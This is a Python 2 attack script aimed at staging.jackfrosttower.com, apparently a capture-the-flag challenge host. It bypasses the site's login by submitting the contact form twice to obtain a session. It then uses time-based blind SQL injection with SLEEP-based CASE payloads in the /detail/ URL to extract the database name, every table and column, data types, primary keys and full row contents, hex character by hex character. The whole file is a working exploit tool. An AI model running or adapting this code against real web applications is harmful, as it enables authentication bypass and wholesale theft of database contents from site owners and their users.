import requests
import logging
import traceback
import inspect
import httplib
import urllib
import md5
import sys
import re

'''
def patch_send():
    old_send= httplib.HTTPConnection.send
    def new_send( self, data ):
        print data
        return old_send(self, data) #return is not necessary, but never hurts, in case the library is changed
    httplib.HTTPConnection.send= new_send

patch_send()
'''

INT_TYPES = ['INT', 'TINYINT', 'SMALLINT', 'MEDIUMINT', 'BIGINT']
FLOAT_TYPES = ['FLOAT']
DOUBLE_TYPES = ['DOUBLE', 'DECIMAL']
STRING_TYPES = ['VARCHAR', 'DATE', 'DATETIME', 'TIMESTAMP', 'TIME', 'YEAR', 'CHAR', 'BLOB', 'TINYBLOB', 'MEDIUMBLOB', 'LONGBLOB', 'ENUM']

HTTP_SESSION = requests.Session()

def getCsrfToken (response):
	csrfRegex = r"<input.*?name=\"_csrf\" value=\"(.*?)\".*?>"
	return re.search(csrfRegex, response.text).groups()[0]

def bypassAuth ():
	dashboard_get_url = "https://staging.jackfrosttower.com/dashboard"
	contact_get_url = "https://staging.jackfrosttower.com/contact"
	contact_post_url = "https://staging.jackfrosttower.com/postcontact"

	new = '<p class="success">Data Saved to Database!</p>'
	existing = '<p class="success">Email Already Exists</p>'

	postdata = {"fullname":"1@1.1","email":"1@1.1","phone":"1@1.1","country":"-Select-","submit":"SAVE"}

	r = HTTP_SESSION.get(dashboard_get_url)
	if "login" in r.url:
		sys.stderr.write("Need to bypass Auth\n")
		r = HTTP_SESSION.get(contact_get_url)
		sys.stderr.write("First GET done\n")
		
		csrf = getCsrfToken (r)
		postdata["_csrf"] = csrf
		r = HTTP_SESSION.post(contact_post_url, data=postdata)
		sys.stderr.write("First POST done, CSRF token '{}'\n".format(csrf))

		csrf = getCsrfToken (r)
		postdata["_csrf"] = csrf
		r = HTTP_SESSION.post(contact_post_url, data=postdata) # double to bypass
		sys.stderr.write("Second POST done, CSRF token '{}'\n".format(csrf))

		if existing in r.text:
			r = HTTP_SESSION.get(dashboard_get_url)
			if r.url == dashboard_get_url:
				sys.stderr.write("Authentication bypassed, connect.sid is '{}'\n".format(HTTP_SESSION.cookies['connect.sid']))
			else:
				sys.stderr.write("Authentication bypass FAILED\n")

def buildBlind (baseQuery, ifPayload, equalPayload, sleepTime, isLike=False):
	#select_skel = "IF(({})={}, SLEEP({}), NULL)"
	if isLike:
		select_skel = "(SELECT CASE WHEN (({}) LIKE '{}%') THEN (SLEEP({})) ELSE 2 END)"
	else:
		select_skel = "(SELECT CASE WHEN (({})='{}') THEN (SLEEP({})) ELSE 2 END)"

	select = select_skel.format(ifPayload, equalPayload, sleepTime)

	injection = baseQuery.format(select)
	#print "Injection payload {}".format(injection)

	return injection

def sendRequest (baseUrl, sleepTime):
	response = None
	try:
		response = HTTP_SESSION.get(baseUrl, timeout=sleepTime)
		if response.url != baseUrl:
			bypassAuth ()
			response = sendRequest(baseUrl, sleepTime)
	except requests.exceptions.Timeout:
		sys.stderr.write ("Timed out, assuming valid blind\t")
		return sleepTime
	except Exception as e:
		# Resend and hope
		print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
		print "!!!!!! RESEND AND HOPE !!!!!!"
		print " ! Excpetion: {} !".format(e)
		print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
		bypassAuth ()
		response = sendRequest(baseUrl, sleepTime)
	return response

def runBlind (baseUrl, sqli, sleepTime):
	token = HTTP_SESSION.get('https://staging.jackfrosttower.com/detail/').text

	sys.stderr.write(sqli + "\t")

	baseUrl = baseUrl.format(urllib.quote(sqli), token)

	response = sendRequest(baseUrl, sleepTime)
	if isinstance(response, int):
		sys.stderr.write("Rectified SQLi, assumed valid\n")
		return True
	#print response.text

	elapsed = response.elapsed.seconds
	#print response.content
	sys.stderr.write("Query took {} seconds\t".format(elapsed))

	sys.stderr.write("\n")

	if elapsed >= sleepTime:
		return True
	else:
		return False

def baseEqualBlind (baseUrl, baseQuery, queryPayload, equalPayload, sleepTime):
	sqli = buildBlind(baseQuery, queryPayload, equalPayload, sleepTime)

	blindResult = runBlind(baseUrl, sqli, sleepTime)

	if blindResult:
		blindResult = runBlind (baseUrl, sqli, sleepTime)
		if blindResult:
			return True
	return False		

def baseIntBlind (baseUrl, baseQuery, queryPayload, sleepTime):
	counter = 0
	length = None

	while counter != length:
		sqli = buildBlind(baseQuery, queryPayload, counter, sleepTime)

		blindResult = runBlind(baseUrl, sqli, sleepTime)

		if blindResult:
			blindResult = runBlind (baseUrl, sqli, sleepTime)
			if blindResult:
				length = counter
		else:
			counter += 1

	return length

def baseHexBlind (baseUrl, baseQuery, queryPayload, sleepTime, likePayload, isLike):
	hexAlphabeth = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"]
	counter = 0
	length = None

	for hexChar in hexAlphabeth:
		sqli = buildBlind(baseQuery, queryPayload, likePayload + hexChar, sleepTime, True)

		blindResult = runBlind(baseUrl, sqli, sleepTime)
		if blindResult:
			blindResult = runBlind (baseUrl, sqli, sleepTime)
			if blindResult:
				return hexChar

	# Recheck and hope
	print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
	print "!!!!!! RECHECK AND HOPE !!!!!!"
	print " ! Result not in alphabeth !"
	print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
	return baseHexBlind (baseUrl, baseQuery, queryPayload, sleepTime, likePayload, isLike)

def hexLengthBlind (baseUrl, baseQuery, queryPayload, sleepTime):
	result = baseIntBlind (baseUrl, baseQuery, queryPayload, sleepTime)
	return result

def getSchemaNameLength (baseUrl, baseQuery, sleepTime):
	queryPayload = "SELECT CHAR_LENGTH(HEX(database()))"
	return hexLengthBlind (baseUrl, baseQuery, queryPayload, sleepTime)

def getSchemaName (baseUrl, baseQuery, schemaNameLength, sleepTime):
	schemaName = ""
	for i in range(1, schemaNameLength + 1):
		queryPayload = "SELECT LOWER(HEX(database()))".format(i)
		schemaNameChar = baseHexBlind (baseUrl, baseQuery, queryPayload, sleepTime, schemaName, True)
		schemaName += schemaNameChar
		#print schemaNameChar,

	return schemaName

def getSchema (baseUrl, baseQuery, sleepTime):
	schemaNameLength = getSchemaNameLength (baseUrl, baseQuery, sleepTime)
	print "Schema has a {} char long hex encoded name".format(schemaNameLength)

	schemaName = getSchemaName(baseUrl, baseQuery, schemaNameLength, sleepTime)
	schemaNameDecoded = schemaName.decode("hex")
	print "Schema has name {} [hex {}]".format(schemaNameDecoded, schemaName)

	return schemaNameDecoded

def getTableNameLength (baseUrl, baseQuery, tableSchema, tableNumber, sleepTime, otherTables):
	queryPayload = "SELECT CHAR_LENGTH(HEX(table_name)) FROM information_schema.tables WHERE table_schema = '{}'".format(tableSchema, tableNumber)
	for table in otherTables:
		queryPayload += " AND table_name!='{}'".format(table)
	queryPayload += " LIMIT 1"

	return hexLengthBlind (baseUrl, baseQuery, queryPayload, sleepTime)

def getNumberOfTables (baseUrl, baseQuery, tableSchema, sleepTime):
	queryPayload = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = '{}'".format(tableSchema)
	return baseIntBlind (baseUrl, baseQuery, queryPayload, sleepTime)	

def getTableName (baseUrl, baseQuery, tableSchema, tableNumber, tableNameLength, sleepTime, otherTables):
	tableName = ""
	for i in range(1, tableNameLength + 1):
		queryPayload = "SELECT LOWER(HEX(table_name)) FROM information_schema.tables WHERE table_schema = '{}'".format(tableSchema)
		for table in otherTables:
			queryPayload += " AND table_name!='{}'".format(table)
		queryPayload += " LIMIT 1"
		tableNameChar = baseHexBlind (baseUrl, baseQuery, queryPayload, sleepTime, tableName, True)
		tableName += tableNameChar
		#print tableNameChar, 

	return tableName

def getNumberOfColumns (baseUrl, baseQuery, tableSchema, tableName, sleepTime):
	queryPayload = "SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = '{}' AND table_name='{}'".format(tableSchema, tableName)
	return baseIntBlind (baseUrl, baseQuery, queryPayload, sleepTime)	

def getColumnNameLength (baseUrl, baseQuery, tableSchema, tableName, columnNumber, sleepTime, otherColumns):
	queryPayload = "SELECT CHAR_LENGTH(HEX(column_name)) FROM information_schema.columns WHERE table_schema = '{}' AND table_name='{}'".format(tableSchema, tableName)
	for column in otherColumns:
		queryPayload += " AND column_name != '{}'".format(column['columnName'])
	queryPayload += " LIMIT 1"

	return hexLengthBlind (baseUrl, baseQuery, queryPayload, sleepTime)

def getColumnName (baseUrl, baseQuery, tableSchema, tableName, columnNumber, columnNameLength, sleepTime, otherColumns):
	columnName = ""
	for i in range(1, columnNameLength + 1):
		queryPayload = "SELECT LOWER(HEX(column_name)) FROM information_schema.columns WHERE table_schema = '{}' AND table_name='{}'".format(tableSchema, tableName)
		for column in otherColumns:
			queryPayload += " AND column_name != '{}'".format(column['columnName'])
		queryPayload += " LIMIT 1"
		columnNameChar = baseHexBlind (baseUrl, baseQuery, queryPayload, sleepTime, columnName, True)
		columnName += columnNameChar
		#print columnNameChar

	return columnName

def getTables (baseUrl, baseQuery, tableSchema, sleepTime):
	tables = []
	number_of_tables = getNumberOfTables(baseUrl, baseQuery, tableSchema, sleepTime)

	print "Table Schema {} has {} tables".format(tableSchema, number_of_tables)

	for tableNumber in range(number_of_tables):
		tableNameLength = getTableNameLength (baseUrl, baseQuery, tableSchema, tableNumber, sleepTime, tables)
		print "Table Schema {} Table #{} has a {} char long hex encoded name".format(tableSchema, tableNumber, tableNameLength)

		tableName = getTableName(baseUrl, baseQuery, tableSchema, tableNumber, tableNameLength, sleepTime, tables)
		tableNameDecoded = tableName.decode("hex")
		print "Table Schema {} Table #{} has name {} [hex {}]".format(tableSchema, tableNumber, tableNameDecoded, tableName)

		tables.append(tableNameDecoded);

	return tables

def getColumnType (baseUrl, baseQuery, tableName, columnName, sleepTime):
	types = INT_TYPES + FLOAT_TYPES + DOUBLE_TYPES + STRING_TYPES

	for t in types:
		queryPayload = "SELECT UPPER(DATA_TYPE) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{}' AND COLUMN_NAME = '{}'".format(tableName, columnName)
		if baseEqualBlind (baseUrl, baseQuery, queryPayload, t, sleepTime):
			return t

def getIsColumnPK (baseUrl, baseQuery, tableSchema, tableName, columnName, sleepTime):
	queryPayload = "SELECT column_key FROM information_schema.columns WHERE table_schema = '{}' AND table_name='{}' AND column_name='{}'".format(tableSchema, tableName, columnName)
	return baseEqualBlind (baseUrl, baseQuery, queryPayload, "PRI", sleepTime)

def getColumns (baseUrl, baseQuery, tableSchema, tableName, sleepTime):
	columns = []
	foundPK = False
	number_of_columns = getNumberOfColumns(baseUrl, baseQuery, tableSchema, tableName, sleepTime)

	print "Table Schema {} Table {} has {} columns".format(tableSchema, tableName, number_of_columns)

	for columnNumber in range(number_of_columns):
		columnNameLength = getColumnNameLength (baseUrl, baseQuery, tableSchema, tableName, columnNumber, sleepTime, columns)
		print "Table Schema {} Table {} column #{} has a {} char long hex encoded name".format(tableSchema, tableName, columnNumber, columnNameLength)

		columnName = getColumnName(baseUrl, baseQuery, tableSchema, tableName, columnNumber, columnNameLength, sleepTime, columns)
		columnNameDecoded = columnName.decode("hex")
		print "Table Schema {} Table {} column #{} has name {} [hex {}]".format(tableSchema, tableName, columnNumber, columnNameDecoded, columnName)

		columnType = getColumnType(baseUrl, baseQuery, tableName, columnNameDecoded, sleepTime)
		print "Table Schema {} Table {} column {} has type {}".format(tableSchema, tableName, columnNameDecoded, columnType)		

		if foundPK:
			isPK = False
		else:
			isPK = getIsColumnPK(baseUrl, baseQuery, tableSchema, tableName, columnNameDecoded, sleepTime)

		columns.append({'columnName':columnNameDecoded, 'columnType': columnType, 'isPK': isPK});

	return columns

def getNumberOfRows (baseUrl, baseQuery, tableName, sleepTime):
	queryPayload = "SELECT COUNT(*) FROM {}".format(tableName)
	return baseIntBlind (baseUrl, baseQuery, queryPayload, sleepTime)

def getDataLength (baseUrl, baseQuery, tableName, columnName, rowNumber, sleepTime, otherRows, pkName, otherPKs):
	queryPayload = "SELECT CHAR_LENGTH(HEX({})) FROM {}".format(columnName, tableName)

	for i in range(0, len(otherPKs)):
		if i == 0:
			queryPayload += " WHERE {} != {}".format(pkName, otherPKs[i])
		else:
			queryPayload += " AND {} != {}".format(pkName, otherPKs[i])
	queryPayload += " LIMIT 1"

	return hexLengthBlind (baseUrl, baseQuery, queryPayload, sleepTime)

def getDataContent (baseUrl, baseQuery, tableName, columnName, rowNumber, dataLength, sleepTime, pkName, otherPKs):
	content = ""
	for j in range(1, dataLength + 1):
		queryPayload = "SELECT LOWER(HEX({})) FROM {}".format(columnName, tableName)
		for i in range(0, len(otherPKs)):
			if i == 0:
				queryPayload += " WHERE {} != {}".format(pkName, otherPKs[i])
			else:
				queryPayload += " AND {} != {}".format(pkName, otherPKs[i])
		queryPayload += " LIMIT 1"		
		contentChar = baseHexBlind (baseUrl, baseQuery, queryPayload, sleepTime, content, True)
		content += contentChar
		#print contentChar,

	return content

def getRows (baseUrl, baseQuery, tableName, columns, sleepTime):
	number_of_rows = getNumberOfRows(baseUrl, baseQuery, tableName, sleepTime)
	print "Table {} has {} rows".format(tableName, number_of_rows)

	pks = []
	pk = None
	pkIndex = None
	for i in range(0, len(columns)):
		if columns[i]['isPK']:
			pk = columns[i]['columnName']
			pkIndex = i

	for i in range(0, number_of_rows):
		row = []
		for column in columns:
			data_length = getDataLength(baseUrl, baseQuery, tableName, column['columnName'], i, sleepTime, row, pk, pks)
			print "Table {} column {} row #{} data has hex encoded length {}".format(tableName, column['columnName'], i, data_length)

			data_content = getDataContent(baseUrl, baseQuery, tableName, column['columnName'], i, data_length, sleepTime, pk, pks)

			if column['columnType'] in INT_TYPES:
				decoded_data_content = int(data_content, 16)
			elif column['columnType'] in FLOAT_TYPES:
				decoded_data_content = float(data_content, 0)
			elif column['columnType'] in DOUBLE_TYPES:
				decoded_data_content = double(data_content, 0)
			else: # Everything else fallbacks as STRING_TYPES
				decoded_data_content = data_content.decode('hex')

			print "Table {} column {} row#{} content is {} [hex {}]".format(tableName, column, i, decoded_data_content, data_content)
			row.append(decoded_data_content)

		pks.append(row[pkIndex])
		
		print "Table {} row#{} has content {}".format(tableName, i, row)

def main ():
	baseUrl  = "https://staging.jackfrosttower.com/detail/{}"
	#baseUrl  = "http://localhost:1155/detail/{}"
	baseQuery = "1,{}"
	sleepTime = 1

	print "### Setup ###"
	print "Base URL                 : {}".format(baseUrl.format("PAYLOAD", "TOKEN"))
	print "Base Query               : {}".format(baseQuery.format("QUERY_PAYLOAD"))
	print "Sleep Time               : {}".format(sleepTime)
	print "### Run ###"

	tableSchema = getSchema (baseUrl, baseQuery, sleepTime)
	#tableSchema = "encontact"
	tables = getTables (baseUrl, baseQuery, tableSchema, sleepTime)
	#tables = ["todo"]

	for table in tables:
		columns = getColumns (baseUrl, baseQuery, tableSchema, table, sleepTime)
		#columns = [{'columnName': 'id', 'columnType': 'INT', 'isPK': True}, {'columnName': 'note', 'columnType': 'VARCHAR', 'isPK': False}, {'columnName': 'completed', 'columnType': 'TINYINT', 'isPK': False}]
		if table != "uniquecontact":
			print "Table Schema {} Table {} Columns {}".format(tableSchema, table, columns)

			getRows (baseUrl, baseQuery, table, columns, sleepTime)

if __name__ == "__main__":
	main()